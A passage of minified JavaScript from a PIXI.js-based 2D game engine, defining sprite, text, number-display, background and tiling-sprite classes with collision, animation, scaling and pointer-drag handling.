                        this.checkCollisionOfEdge("_top_edge_") && (i = -Math.abs(i)), this.checkCollisionOfEdge("_bottom_edge_") && (i = Math.abs(i));
            }
            this.towardsTo(-180 * Math.atan2(i, e) / Math.PI);
        }
    }, {
        key: "bounceOfSprite",
        value: function (t) {
            if (!t) return !1;
            var e, i, n, s, r, a, o, l, h = this.app.collisionManager.collisionPairs[this.id];
            h && -1 !== h.indexOf(t.id) && (h = parseFloat(this.x), n = -parseFloat(this.y),
                e = h - parseFloat(this.width) / 2, i = n + parseFloat(this.height) / 2, h += parseFloat(this.width) / 2,
                n -= parseFloat(this.height) / 2, a = parseFloat(t.x), o = -parseFloat(t.y), s = a - parseFloat(t.width) / 2,
                r = o + parseFloat(t.height) / 2, a += parseFloat(t.width) / 2, o -= parseFloat(t.height) / 2,
                t = Math.cos(this.towardsRotationValue), l = Math.sin(this.towardsRotationValue),
                s < e && e < a && a < h && (t = Math.abs(t)), s < h && h < a && e < s && (t = -Math.abs(t)),
                n < r && o < n && r < i && (l = Math.abs(l)), o < i && i < r && n < o && (l = -Math.abs(l)),
                this.towardsTo(-180 * Math.atan2(l, t) / Math.PI));
        }
    }, {
        key: "switchStyle",
        value: function (t, e) {
            this.textureMap && this.textureMap[t] && this.currentStyleId !== t && (this.currentStyleId = t,
                this.currentFrameId = this.textureMap[t][0].id, this.resetFrame(e), this.currentFrameIndex = 0,
                "1" !== (e = e || "1") && this._body && this._physicsSystem.syncStyle(this.id),
                this.eventEmitter.emit(this.eventEmitter.SystemEventType.switchStyle, this.id));
        }
    }, {
        key: "setSptiteTexture",
        value: function (t) {
            t = PIXI__namespace.Texture.from(t), this.updateTexture(t, "2");
        }
    }, {
        key: "changeSize",
        value: function (t, e) {
            this[t] = e, this._body && this._physicsSystem.syncStyle(this.id);
        }
    }, {
        key: "resetFrame",
        value: function (t) {
            var e = this.textureMap[this.currentStyleId];
            this.frames[0] && this.updateTexture(e[0].texture, t);
        }
    }, {
        key: "setFrame",
        value: function (t) {
            var e = this.textureMap[this.currentStyleId];
            t <= e.length && 1 <= t && (this.currentFrameIndex = t - 1, this.updateTexture(e[this.currentFrameIndex].texture));
        }
    }, {
        key: "nextFrame",
        value: function () {
            var t = this.textureMap[this.currentStyleId];
            this.currentFrameIndex < t.length - 1 ? (this.currentFrameIndex = this.currentFrameIndex + 1,
                this.updateTexture(t[this.currentFrameIndex].texture)) : (this.currentFrameIndex = 0,
                    this.updateTexture(t[0].texture));
        }
    }, {
        key: "canShowCollider",
        value: function (t) {
            var e, i = !0;
            return !t.noCollision && (this._allCollisionPairs || (this._allCollisionPairs = this.app.runtimeData.collision_pairs[this._scene.id].toString()),
                e = t.mother || t.id, -1 !== this._allCollisionPairs.indexOf(e) || -1 !== this._allCollisionPairs.indexOf(t.origin)) || (i = !1),
                this._behaviorInst && (this._behaviorInst.Solid || this._behaviorInst.Platform || this._behaviorInst.Jumpthrough) && (i = !0),
                !!t.checkCollisionBoundaryFlag.length || i;
        }
    }, {
        key: "destroyOutlineCollider",
        value: function () {
            this._outlineCollider && (this._outlineCollider.parent.removeChild(this._outlineCollider),
                this._outlineCollider.destroy(), this._outlineCollider = null);
        }
    }, {
        key: "_drawCollider",
        value: function (t) {
            var e, i;
            LB.isDebug && "background" !== this.type && this.visible && (e = this.app.runtimeData.getSpriteById(this.id)) && this.canShowCollider(e) && (this.app.loaderManager.imgOutlineData[t] || this.app.runtimeData.config.outlines && this.app.runtimeData.config.outlines[t],
                t = this._config.outline, i = 2600330, e && e.lastCollsionList && e.lastCollsionList.length && (i = 16711680),
                (e = this.app._outlineCollider).beginFill(16777215, .2), e.lineStyle(2, i), t && Object.keys(t).length ? "rect" === t.type ? (i = this.getRectPoints(),
                    this.drawPolygonCollider(e, i)) : "circle" === t.type ? (i = this.getCircle(), e.drawCircle(i.position.x, i.position.y, i.radius)) : (t = this.getPolygonByOutline(),
                        this.drawPolygonCollider(e, t)) : (i = this.getPolygon(), this.drawPolygonCollider(e, i)),
                e.endFill());
        }
    }, {
        key: "drawCollider",
        value: function (t) {
            var e, i;
            LB.isDebug && "background" !== this.type && this.visible ? (e = this.app.runtimeData.getSpriteById(this.id)) && (this.canShowCollider(e) ? (this.app.loaderManager.imgOutlineData[t] || this.app.runtimeData.config.outlines && this.app.runtimeData.config.outlines[t],
                t = this._config.outline, i = 2600330, e && e.lastCollsionList && e.lastCollsionList.length && (i = 16711680),
                (e = this._outlineCollider) ? e.clear() : e = new PIXI__namespace.Graphics(), e.beginFill(16777215, .2),
                e.lineStyle(2, i), t && Object.keys(t).length ? "rect" === t.type ? (i = this.getRectPoints(),
                    this.drawPolygonCollider(e, i)) : "circle" === t.type ? (i = this.getCircle(), e.drawCircle(i.position.x, i.position.y, i.radius)) : (t = this.getPolygonByOutline(),
                        this.drawPolygonCollider(e, t)) : (i = this.getPolygon(), this.drawPolygonCollider(e, i)),
                e.endFill(), this.parent.parent.addChild(e), this._outlineCollider = e) : this.destroyOutlineCollider()) : this.destroyOutlineCollider();
        }
    }, {
        key: "drawPolygonCollider",
        value: function (t, e) {
            t.moveTo(e[0].x, e[0].y);
            for (var i = 1; i < e.length; i++) t.lineTo(e[i].x, e[i].y);
            t.closePath();
        }
    }, {
        key: "gPostion",
        get: function () {
            return this.calGlobalPosition(), {
                x: this.globalPosition.x,
                y: -this.globalPosition.y
            };
        }
    }, {
        key: "frames",
        get: function () {
            return this.textureMap[this.currentStyleId] || [];
        }
    }]), a;
}(PIXI__namespace.Sprite), Variable = function () {
    function s(t, e, i) {
        classCallCheck(this, s);
        var t = possibleConstructorReturn(this, (s.__proto__ || Object.getPrototypeOf(s)).call(this, t, null, e, i)), n = getDeviceInfo();
        return t.PixelRatio = n.devicePixelRatio, t.options = e, t.app = i, t.numContainer = new PIXI__namespace.Sprite(),
            t.numContainer.anchor.set(.5), t.initVariable(e), t.addChild(t.numContainer), t;
    }
    return inherits(s, Sprite), createClass(s, [{
        key: "drawNum",
        value: function (t) {
            t = Strip((this._value = t) || 0).toFixed(this.options.fixed || 0), this.numContainer.position.x = 0;
            for (var e = (t || 0).toString(), i = e.length, n = (2 === this.options.align && (e = e.split("").reverse().join("")),
                0), s = void 0, r = 0; r < i; r++) {
                var a, o = this.getImgUrlByName(e[r]);
                (o = this.app.loaderManager.getTexture(o)) && ((a = new PIXI__namespace.Sprite(o)).x = n,
                    a.anchor.set(0), a.width = o.width * this.PixelRatio / 2, a.height = o.height * this.PixelRatio / 2,
                    a.y = -a.height / 2, a.blendMode = this.options.blendMode || 0, this.options.tint && (a.tint = "0x" + this.options.tint.slice(1, 7)),
                    this.numContainer.addChild(a), o = (("-" == e[r] ? 8 : 2) + o.width) * this.PixelRatio / 2,
                    2 === this.options.align ? 0 < r && (a.x = -(n + a.width), n += o) : n += o, s = o);
            }
            1 === this.options.align && (this.numContainer.position.x = (s - n) / 2), this.numContainer.position.x -= s / 2;
        }
    }, {
        key: "getImgUrlByName",
        value: function (t) {
            var e = this.options.frames;
            return "-" == t ? t = 10 : "." == t && (t = 11), e[t] ? e[t].id : "";
        }
    }, {
        key: "initVariable",
        value: function (t) {
            this.drawNum(t.value);
        }
    }, {
        key: "reset",
        value: function (t) {
            this.noCollision = !1, get(s.prototype.__proto__ || Object.getPrototypeOf(s.prototype), "initConfig", this).call(this),
                t && (this.id = t), this._value = 0;
        }
    }, {
        key: "setValue",
        value: function (t) {
            this.numContainer.removeChildren(), this.drawNum(t);
        }
    }, {
        key: "setColor",
        value: function (e) {
            this.numContainer.children.forEach(function (t) {
                t.tint = e;
            });
        }
    }, {
        key: "addValue",
        value: function (t) {
            this.numContainer.removeChildren(), this.drawNum(Number(this._value || 0) + Number(t));
        }
    }]), s;
}(), FAST_PRINET_WORD_EVERY_SECOND = 10, SLOW_PRINET_WORD_EVERY_SECOND = 3, DEFAULT_TEXT = "defaultText", BACKGROUND_RADIU = 0, ALIGN_MAP = {
    0: "left",
    1: "center",
    2: "right"
}, Text = function () {
    function h(t, e) {
        classCallCheck(this, h);
        var i = t.id, n = t.text, s = t.currentStyleId, r = t.theme, a = t.padding, o = t.blendMode, l = {
            visible: t.visible,
            x: t.x,
            name: t.name,
            y: t.y,
            type: "text",
            width: t.width,
            height: t.height,
            rotation: t.rotation,
            origin: t.origin,
            alpha: t.alpha,
            widgetModeV: t.widgetModeV,
            widgetModeH: t.widgetModeH,
            widgetH: t.widgetH,
            widgetV: t.widgetV
        };
        return (i = possibleConstructorReturn(this, (h.__proto__ || Object.getPrototypeOf(h)).call(this, i, null, l, e))).padding = a,
            i.app = e, i.theme = r || i.app.runtimeData.styles[s] && i.app.runtimeData.styles[s].frame,
            i._options = l, i.options = t, i.isNomarlTextType = i.options.currentStyleId == DEFAULT_TEXT,
            a && a.length && !i.isNomarlTextType && (i.textWidth = i.options.width - (a[1] + a[3]) * t.scale.x,
                i.textHeight = i.options.height - (a[0] + a[2]) * t.scale.y), i.isNomarlTextType && (i.textWidth = t.width),
            i.startAnimation = !1, i.animationIndex = 0, i.inputReady = !0, i.textContent = new PIXI__namespace.Text(),
            i.textContent.blendMode = o || 0, i.initTextStyle(t), i.text = n || "", i.setText(i.text),
            i.theme && !i.isNomarlTextType ? (r = i.app.loaderManager.getTexture(i.theme[0].id) || new PIXI__namespace.Texture.from(i.theme[0].url)) && (t.x = 0,
                t.y = 0, t.rotation = 0, t.visible = !0, t.widgetModeH = 0, t.widgetModeV = 0, t.setSize = 1,
                i.themeContent = new Sprite(t.id, r, t, e, !0), i.addChild(i.themeContent), i.themeContent.tint = "0x" + i.options.backgroundColor.hex.slice(1, 7),
                i.themeContent.alpha = i.options.backgroundColor.alpha) : i.options.backgroundColor && 0 != i.options.backgroundColor.alpha && (i.graphicContent = new PIXI__namespace.Graphics(),
                    i.drawBackground(), i.addChild(i.graphicContent)), i.addChild(i.textContent), i;
    }
    return inherits(h, Sprite), createClass(h, [{
        key: "reset",
        value: function (t) {
            get(h.prototype.__proto__ || Object.getPrototypeOf(h.prototype), "reset", this).call(this, t),
                this.initTextStyle(this.options);
        }
    }, {
        key: "initTextStyle",
        value: function (t) {
            t = {
                align: ALIGN_MAP[t.align] || "center",
                fill: t.fillColor.rgba || 16777215,
                breakWords: !0,
                fontFamily: isMiniGame && /ios/i.test(wxSystemInfo.system) ? "Arial" : "Microsoft YaHei",
                fontSize: t.fontSize || 26,
                fontWeight: t.fontWeight || "normal",
                wordWrap: !0,
                wordWrapWidth: this.textWidth || 100,
                lineHeight: (t.lineHeight || 1) * (t.fontSize || 26),
                stroke: t.stroke ? t.stroke.rgba : 16777215,
                strokeThickness: t.strokeThickness || 0
            }, this.textContent.style = new PIXI__namespace.TextStyle(t), this.textContent.texture.baseTexture.scaleMode = 1;
        }
    }, {
        key: "setTextAlign",
        value: function () {
            0 === this.options.align ? this.textContent.x = -this.options.width / 2 + this.padding[3] * this.options.scale.x : 2 === this.options.align ? this.textContent.x = this.options.width / 2 - this.padding[1] * this.options.scale.x - this.textContent.width : this.textContent.x = -this.options.width / 2 + this.padding[3] * this.options.scale.x + (this.options.width - this.padding[1] * this.options.scale.x - this.padding[3] * this.options.scale.x) / 2 - this.textContent.width / 2,
                0 === this.options.verticalAlign ? this.textContent.y = -this.options.height / 2 + this.padding[0] * this.options.scale.y + (this.options.lineHeight - 1) / 2 * this.options.fontSize : 2 === this.options.verticalAlign ? this.textContent.y = this.options.height / 2 - this.padding[2] * this.options.scale.y - this.textContent.height + (this.options.lineHeight - 1) / 2 * this.options.fontSize : this.textContent.y = -this.options.height / 2 + this.padding[0] * this.options.scale.y + (this.options.height - this.padding[2] * this.options.scale.y - this.padding[0] * this.options.scale.y) / 2 - this.textContent.height / 2 + (this.options.lineHeight - 1) / 2 * this.options.fontSize,
                this.isNomarlTextType && (this.textContent.y = -this.textContent.height / 2);
        }
    }, {
        key: "update",
        value: function () {
            get(h.prototype.__proto__ || Object.getPrototypeOf(h.prototype), "update", this).call(this),
                this.startAnimation && Date.now() - this.startTime > 1e3 / (2 == this.options.effect ? FAST_PRINET_WORD_EVERY_SECOND : SLOW_PRINET_WORD_EVERY_SECOND) && (this.startTime = Date.now(),
                    this.printAnimation());
        }
    }, {
        key: "setColor",
        value: function (t, e) {
            e ? this.themeContent ? this.themeContent.tint = t : this.graphicContent.tint = t : this.textContent.style.fill = t;
        }
    }, {
        key: "overFlow",
        value: function () {
            if (this.newText = "", null !== this.text && void 0 !== this.text) {
                for (var t = PIXI__namespace.TextMetrics.measureText(this.text, this.textContent.style), e = 0, i = this.text + "", n = 0; n < t.lines.length; n++) if (t.lines[n]) {
                    if (!((e += t.lineHeight) < this.textHeight)) break;
                    var s = i.split(t.lines[n]), r = s.shift(), i = s.join(t.lines[n]);
                    this.newText += r + t.lines[n];
                }
                if (this.textHeight >= e) this.newText = this.text; else {
                    this.totalHeight = e - t.lineHeight;
                    for (var a = 0, o = 0, n = this.newText.length - 1; 0 <= n && (o++, this.newText.charCodeAt(n) <= 128 ? a += 1 : a += 2,
                        !(3 <= a)); n--);
                    this.newText = this.newText.substring(0, this.newText.length - o), this.newText = this.newText + "...";
                }
            }
        }
    }, {
        key: "drawBackground",
        value: function () {
            var t, e;
            this.graphicContent.scale.set(1), this.graphicContent.beginFill(16777215, this.options.backgroundColor.alpha),
                this.graphicContent.tint = parseInt(this.options.backgroundColor.hex.replace("#", ""), 16),
                this.isNomarlTextType ? (e = 1.5 * ((t = this.options.lineHeight * this.options.fontSize) - this.options.fontSize),
                    this.graphicContent.drawRoundedRect(this.textContent.x - e, this.textContent.y - e, this.textContent.width + 2 * e, this.textContent.height - t + this.options.fontSize + 2 * e, e)) : this.graphicContent.drawRoundedRect(this.textContent.x, this.textContent.y, this.textWidth, this.totalHeight || this.textHeight, BACKGROUND_RADIU),
                this.graphicContent.endFill();
        }
    }, {
        key: "printAnimation",
        value: function () {
            this.animationIndex++, this.textContent.text = this.newText.substring(0, this.animationIndex),
                this.animationIndex > this.newText.length && (this.startAnimation = !1, this.animationIndex = 0,
                    this.inputReady = !0);
        }
    }, {
        key: "setText",
        value: function (t) {
            this.inputReady && ("string" == typeof t && (t = t.replace(/\\n/g, "\n")), this.inputReady = !1,
                this.text = t, this.isNomarlTextType ? this.newText = t : this.overFlow(), 1 == this.options.effect || 2 == this.options.effect ? (this.textContent.text = "",
                    this.startAnimation = !0, this.startTime = Date.now()) : (this.textContent.text = this.newText,
                        this.inputReady = !0), this.isNomarlTextType && this.textContent.width > this.options.width && (this.textContent.style.wordWrapWidth = this.textContent.width),
                this.setTextAlign());
        }
    }, {
        key: "getText",
        value: function () {
            return this.text;
        }
    }, {
        key: "destroy",
        value: function () {
            this.themeContent && (this.themeContent.destroy(), this.themeContent = null), this.textContent && (this.textContent.destroy(!0),
                this.textContent = null), this.graphicContent && (this.graphicContent.destroy(!0),
                    this.graphicContent = null), get(h.prototype.__proto__ || Object.getPrototypeOf(h.prototype), "destroy", this).call(this);
        }
    }]), h;
}(), Background = function () {
    function u(t, e, i, n) {
        classCallCheck(this, u);
        var s, r = (h = getDeviceInfo()).GAME_HEIGHT, a = h.GAME_WIDTH, o = h.windowHeight, l = (h.windowWidth,
            h.devicePixelRatio), h = h.isMiniGame;
        return i.gameWidth = a, i.gameHeight = r, o *= l, h && 2 === i.repeat && r < o && (i.gameHeight = o),
            0 === i.repeat || 2 === i.repeat ? s = possibleConstructorReturn(this, (u.__proto__ || Object.getPrototypeOf(u)).call(this, t, null, i, n)) : 1 === i.repeat && (s = possibleConstructorReturn(this, (u.__proto__ || Object.getPrototypeOf(u)).call(this, t, e, i, n))),
            s.realWidth = i.gameWidth, s.realHeight = i.gameHeight, s.init(e, i), possibleConstructorReturn(s);
    }
    return inherits(u, Sprite), createClass(u, [{
        key: "init",
        value: function (t, e) {
            this.isBackground = !0, this.options = e, t || (e.repeat = 1), 0 !== e.repeat && 2 !== e.repeat || ((t = new (0 === e.repeat ? PIXI__namespace.TilingSprite : PIXI__namespace.Sprite)(t)).width = e.gameWidth,
                t.height = e.gameHeight, t.anchor.set(.5), this.addChild(t)), this.gameWidth = e.gameWidth,
                this.gameHeight = e.gameHeight, this.scaleBackgroundSpriteToStage(this.options.repeat, this.options.adaptationMode);
        }
    }, {
        key: "setColor",
        value: function (t) {
            this.tint = t, this.app.backgroundColor = t;
        }
    }, {
        key: "resetTexture",
        value: function (t, e) {
            this.removeChildren(), this.texture = t, this.width = t.width, this.height = t.height,
                this.init(t, e);
        }
    }, {
        key: "moveX",
        value: function (t) {
            this.x += t;
        }
    }, {
        key: "moveY",
        value: function (t) {
            this.y -= t;
        }
    }, {
        key: "setPosition",
        value: function (t, e) {
            null != t && this.setX(t), null != e && this.setY(e);
        }
    }, {
        key: "setX",
        value: function (t) {
            this.position.x = t, this.x = t;
        }
    }, {
        key: "setY",
        value: function (t) {
            this.y = -t, this.position.y = -t;
        }
    }, {
        key: "getY",
        value: function () {
            return Math.round(100 * -this.y) / 100;
        }
    }, {
        key: "getX",
        value: function () {
            return Math.round(100 * this.x) / 100;
        }
    }, {
        key: "getScale",
        value: function () {
            return 1 !== this.options.repeat ? {
                x: 1,
                y: 1
            } : this.scale;
        }
    }, {
        key: "getWidth",
        value: function () {
            return (1 !== this.options.repeat ? this.children[0] : this).width;
        }
    }, {
        key: "getHeight",
        value: function () {
            return (1 !== this.options.repeat ? this.children[0] : this).height;
        }
    }, {
        key: "updateTexture",
        value: function (t) {
            this.resetTexture(t, this._config), this.scaleBackgroundSpriteToStage(this.options.repeat, this.options.adaptationMode);
        }
    }, {
        key: "scaleBackgroundSpriteToStage",
        value: function (t, e) {
            var i, n, s;
            1 === t ? void 0 === e ? (i = (t = getDeviceInfo()).GAME_HEIGHT, t = t.GAME_WIDTH / this.texture.width,
                i /= this.texture.height, t = Math.max(t, i), i = this.scale.x < 0 ? -1 : 1, s = this.scale.y < 0 ? -1 : 1,
                this.scale.set(t * i, t * s)) : (t = (i = getDeviceInfo()).realWidth, s = i.realHeight,
                    i = t / this.app.stage.scale.x / this.texture.width, t = s / this.app.stage.scale.y / this.texture.height,
                    s = this.scale.x < 0 ? -1 : 1, n = this.scale.y < 0 ? -1 : 1, 0 !== e && (1 === e ? this.scale.set(i * s, i * n) : 2 === e ? this.scale.set(t * s, t * n) : 3 === e && (s = Math.max(i, t),
                        n = this.scale.x < 0 ? -1 : 1, e = this.scale.y < 0 ? -1 : 1, this.scale.set(s * n, s * e)))) : (i = this.children[0],
                            n = (t = getDeviceInfo()).realWidth, s = t.realHeight, i.width = n / this.app.stage.scale.x,
                            i.height = s / this.app.stage.scale.y);
        }
    }]), u;
}(), SpriteEvent = function (t, e) {
    this.target = t, this.data = e;
}, SpriteModifiedEvent = function (t) {
    function e() {
        return null !== t && t.apply(this, arguments) || this;
    }
    return _extends(e, t), e;
}(SpriteEvent), PluginSprite = function (t) {
    function s(t, e, i) {
        classCallCheck(this, s);
        var n = possibleConstructorReturn(this, (s.__proto__ || Object.getPrototypeOf(s)).call(this)), t = (n.id = t,
            n.app = i, getDeviceInfo().devicePixelRatio);
        return n.DEVICEPIXEL = t / 2, n.info = {
            realWidth: n.app.gameWidth,
            realHeight: n.app.gameHeight,
            gameWidth: n.app.gameWidth / 2,
            gameHeight: n.app.gameHeight / 2
        }, n.initConfig(e), n.eventEmitter = getEventEmitter(), n.bindTouchEvent(), n;
    }
    return inherits(s, t), createClass(s, [{
        key: "toggleEvent",
        value: function (t) {
            this.off("pointerdown", this.dragStart), this.off("pointerup", this.pointerUp),
                this.off("pointerupoutside", this.pointerUpOutside), this.off("pointermove", this.dragMove),
                this.off("pointerover", this.pointerOver), this.off("pointerout", this.pointerOut),
                this.interactive = !1, t && (this.interactive = !0, this.bindTouchEvent());
        }
    }, {
        key: "initConfig",
        value: function (t) {
            this.width = t.width, this.height = t.height, this.name = t.name || "", t.scale = t.scale || {
                x: 1,
                y: 1
            }, this.rotation_type = t.rotation_type || 0;
            var e = t.rotation / 180 * Math.PI || 0, e = (this.rotation = e, this.rotationValue = e,
                this.faceRotationValue = 0, this.towardsRotationValue = 0, this.dragMode = t.dragMode || "none",
                this.dragging = !1, this.alpha = t.alpha, t.pivot || (t.pivot = {
                    x: 0,
                    y: 0
                }), t.pivot.x = t.pivot.x / t.scale.x, t.pivot.y = t.pivot.y / t.scale.y, this.origin = t.origin || null,
                t.x), i = t.y, n = void 0 === (n = t.width) ? 0 : n, s = void 0 === (s = t.height) ? 0 : s, r = t.widgetModeH, a = t.widgetModeV, o = t.widgetH, l = t.widgetV;
            isNaN(n) && (n = 0), isNaN(s) && (s = 0), 1 === r ? e = o * this.DEVICEPIXEL - this.info.gameWidth / this.app.stage.scale.x + n / 2 : 2 === r && (e = this.info.gameWidth / this.app.stage.scale.x - o * this.DEVICEPIXEL - n / 2),
                1 === a ? i = this.info.gameHeight / this.app.stage.scale.y - l * this.DEVICEPIXEL - s / 2 : 2 === a && (i = l * this.DEVICEPIXEL - this.info.gameHeight / this.app.stage.scale.y + s / 2),
                this.position.x = Strip(e) || 0, this.position.y = Strip(i) || 0, this.x = this.position.x || 0,
                this.y = -this.position.y || 0, 3 === t.mirror ? (this.scale.y *= -1, this.scale.x *= -1) : 2 === t.mirror ? this.scale.y *= -1 : t.mirror && (this.scale.x *= -1),
                this.visible = !!t.visible, this.interactive = !0, this._config = t || {};
        }
    }, {
        key: "release",
        value: function () {
            get(s.prototype.__proto__ || Object.getPrototypeOf(s.prototype), "destroy", this).call(this, !0);
        }
    }, {
        key: "setPosition",
        value: function (t, e) {
            null != t && this.setX(t), null != e && this.setY(e);
        }
    }, {
        key: "setX",
        value: function (t) {
            this.x = Strip(t), this.position.x = Strip(t);
        }
    }, {
        key: "setY",
        value: function (t) {
            this.y = -Strip(t), this.position.y = -Strip(t);
        }
    }, {
        key: "goTo",
        value: function (t, e) {
            this.setX(t), this.setY(e);
        }
    }, {
        key: "getY",
        value: function () {
            return Math.round(100 * -this.y) / 100;
        }
    }, {
        key: "getX",
        value: function () {
            return Math.round(100 * this.x) / 100;
        }
    }, {
        key: "goForward",
        value: function (t) {
            var e = this.getX() + Math.cos(this.towardsRotationValue) * t, t = this.getY() + Math.sin(this.towardsRotationValue) * t;
            return this.setX(e), this.setY(t), {
                x: e,
                y: t
            };
        }
    }, {
        key: "getRotation",
        value: function () {
            return -this.rotation / Math.PI * 180;
        }
    }, {
        key: "rotateTo",
        value: function (t) {
            this.rotation < 0 && (this.rotation += 2 * Math.PI), t = -t / 180 * Math.PI, this.rotationValue,
                this.rotationValue = t, this.rotation = t;
        }
    }, {
        key: "rotate",
        value: function (t) {
            return this.rotation < 0 && (this.rotation += 2 * Math.PI), t = -t / 180 * Math.PI,
                this.rotationValue = this.rotationValue + t, this.rotation = this.rotationValue,
                this.rotation;
        }
    }, {
        key: "getTowardsRoatation",
        value: function () {
            return this.towardsRotationValue / Math.PI * 180;
        }
    }, {
        key: "getFaceRotation",
        value: function () {
            return -this.faceRotationValue / Math.PI * 180;
        }
    }, {
        key: "towardsTo",
        value: function (t) {
            this.towardsRotationValue = -t / 180 * Math.PI;
        }
    }, {
        key: "faceTo",
        value: function (t) {
            this.faceRotationValue = -t / 180 * Math.PI, this.rotation = this.faceRotationValue + this.rotationValue;
        }
    }, {
        key: "setColor",
        value: function (t) {
            this.tint = t;
        }
    }, {
        key: "setScale",
        value: function (t) {
            var e = this.scale;
            e.x, e.y, this.scale.set(t.x, t.y), this.position.x += this.pivot.x * (this.scale.x - 1),
                this.position.y += this.pivot.y * (this.scale.y - 1), this.x = this.position.x,
                this.y = this.position.y;
        }
    }, {
        key: "setAlpha",
        value: function (t) {
            this.alpha = t;
        }
    }, {
        key: "show",
        value: function () {
            this.visible = !0;
        }
    }, {
        key: "hide",
        value: function () {
            this.visible = !1;
        }
    }, {
        key: "update",
        value: function () {
            this.aabb = null, this.points = null, this.bounds = null;
        }
    }, {
        key: "reset",
        value: function (t) {
            this.update(), this.noCollision = !1, t && (this.id = t);
        }
    }, {
        key: "destroyOutlineCollider",
        value: function () { }
    }, {
        key: "bindTouchEvent",
        value: function () {
            this.on("pointerdown", this.dragStart), this.on("pointerup", this.pointerUp), this.on("pointerupoutside", this.pointerUpOutside),
                this.on("pointermove", this.dragMove), this.on("pointerover", this.pointerOver),
                this.on("pointerout", this.pointerOut);
        }
    }, {
        key: "dragStart",
        value: function (t) {
            this.mouse_down = !0, this.mouse_down_time = Date.now(), this.dragData = t.data,
                this.dragData.pointerPosition = t.data.getLocalPosition(this.parent), this.dragging = !0;
            var e = new SpriteEvent(this, t);
            this.emit(EventType.pointerdown, e), this.eventEmitter.emit(EventType.pointerdown, null, new SpriteEvent(this, t).target.id),
                this.eventEmitter.emit(EventType.press, new SpriteEvent(this, t)), this.scriptNode && this.scriptNode.onTouchStart && this.scriptNode.onTouchStart(t);
        }
    }, {
        key: "dragMove",
        value: function (t) {
            var e, i, n;
            this.dragging && "none" != this.dragMode && (e = this.dragData.getLocalPosition(this.parent),
                i = Sub(Add(this.position.y, e.y), this.dragData.pointerPosition.y), n = Sub(Add(this.position.x, e.x), this.dragData.pointerPosition.x),
                "_horizontal_" == this.dragMode ? this.position.x = n : ("_vertical_" != this.dragMode && (this.position.x = n),
                    this.position.y = i), this.dragData.pointerPosition = e, n = {
                        x: Math.round(this.position.x),
                        y: -Math.round(this.position.y),
                        id: this.id
                    }, this.emit(EventType.update, n), this.eventEmitter.emit(EventType.update, n),
                this.eventEmitter.emit(EventType.press, new SpriteEvent(this, t)), this.scriptNode) && this.scriptNode.onTouchMove && this.scriptNode.onTouchMove(t);
        }
    }, {
        key: "checkOutOfBoundary",
        value: function () {
            return !1;
        }
    }, {
        key: "dragEnd",
        value: function (t) {
            this.dragging = !1, delete this.dragData, this.eventEmitter.emit(EventType.modified, new SpriteModifiedEvent(this, {
                property: "position",
                value: {
                    x: this.position.x,
                    y: -this.position.y
                }
            }));
        }
    }, {
        key: "getAABB",
        value: function () {
            return {
                x: this.x,
                y: this.y,
                width: this.width,
                height: this.height
            };
        }
    }, {
        key: "pointerUp",
        value: function (t) {
            this.dragEnd(), this.mouse_down = !1;
            var e = new SpriteEvent(this, t);
            10 < Date.now() - this.mouse_down_time && Date.now() - this.mouse_down_time < 1e3 && (this.eventEmitter.emit(EventType.click, null, new SpriteEvent(this, t).target.id),
                this.emit(EventType.click, e), this.scriptNode) && this.scriptNode.onClick && this.scriptNode.onClick(t),
                this.eventEmitter.emit(EventType.pointerup, new SpriteEvent(this, t)), this.emit(EventType.loose, e),
                this.eventEmitter.emit(EventType.loose, null, new SpriteEvent(this, t).target.id);
        }
    }, {
        key: "pointerOut",
        value: function () {
            this.cursor = "auto", this.mouse_down = !1;
        }
    }, {
        key: "pointerOver",
        value: function () { }
    }, {
        key: "pointerUpOutside",
        value: function (t) {
            this.dragEnd(), this.mouse_down = !1, this.eventEmitter.emit(EventType.pointerupoutside, new SpriteEvent(this, t));
        }
    }, {
        key: "gPostion",
        get: function () {
            var t = (e = this.app).gameWidth, e = e.gameHeight, i = this.getGlobalPosition();
            return {
                x: i.x - t / 2,
                y: e / 2 - i.y
            };
        }
    }]), s;
}(PIXI__namespace.Container), tempPoint = new PIXI__namespace.Point(), TilingSprite = function () {
    function r(t, e, i, n, s) {
        return classCallCheck(this, r), (t = possibleConstructorReturn(this, (r.__proto__ || Object.getPrototypeOf(r)).call(this, t, e, i, n, s))).tileTransform = new PIXI__namespace.Transform(),
            t._width = i.width, t._height = i.height, t._canvasPattern = null, t.uvMatrix = e.uvMatrix || new PIXI__namespace.TextureMatrix(e),
            t.pluginName = "tilingSprite", t.uvRespectAnchor = !1, t.tileScale.x *= t.DEVICEPIXEL,
            t.tileScale.y *= t.DEVICEPIXEL, t;
    }
    return inherits(r, Sprite), createClass(r, [{
        key: "_onTextureUpdate",
        value: function () {
            this.uvMatrix && (this.uvMatrix.texture = this._texture), this._cachedTint = 16777215;
        }
    }, {
        key: "_render",
        value: function (t) {
            var e = this._texture;
            e && e.valid && (this.tileTransform.updateLocalTransform(), this.uvMatrix.update(),
                t.batch.setObjectRenderer(t.plugins[this.pluginName]), t.plugins[this.pluginName].render(this));
        }
    }, {
        key: "_calculateBounds",
        value: function () {
            var t = this._width * -this._anchor._x, e = this._height * -this._anchor._y, i = this._width * (1 - this._anchor._x), n = this._height * (1 - this._anchor._y);
            this._bounds.addFrame(this.transform, t, e, i, n);
        }
    }, {
        key: "getLocalBounds",
        value: function (t) {
            return 0 === this.children.length ? (this._bounds.minX = this._width * -this._anchor._x,
                this._bounds.minY = this._height * -this._anchor._y, this._bounds.maxX = this._width * (1 - this._anchor._x),
                this._bounds.maxY = this._height * (1 - this._anchor._y), t || (this._localBoundsRect || (this._localBoundsRect = new PIXI__namespace.Rectangle()),
                    t = this._localBoundsRect), this._bounds.getRectangle(t)) : get(r.prototype.__proto__ || Object.getPrototypeOf(r.prototype), "getLocalBounds", this).call(this, t);
        }
    }, {
        key: "containsPoint",
        value: function (t) {
            this.worldTransform.applyInverse(t, tempPoint);
            var t = this._width, e = this._height, i = -t * this.anchor._x;
            return tempPoint.x >= i && tempPoint.x < i + t && (i = -e * this.anchor._y, tempPoint.y >= i) && tempPoint.y < i + e;
        }
    }, {
        key: "destroy",
        value: function (t) {
            get(r.prototype.__proto__ || Object.getPrototypeOf(r.prototype), "destroy", this).call(this, t),
                this.tileTransform = null, this.uvMatrix = null;
        }
    }, {
        key: "setScale",
        value: function (t) {
            this.width = this.texture.width * t.x, this.height = this.texture.height * t.y,
                this.position.x += this.pivot.x * (this.scale.x - 1), this.position.y += this.pivot.y * (this.scale.y - 1),
                this.x = this.position.x, this.y = this.position.y, this._body && this._physicsSystem.setScale(this.id);
        }
    }, {
        key: "clampMargin",
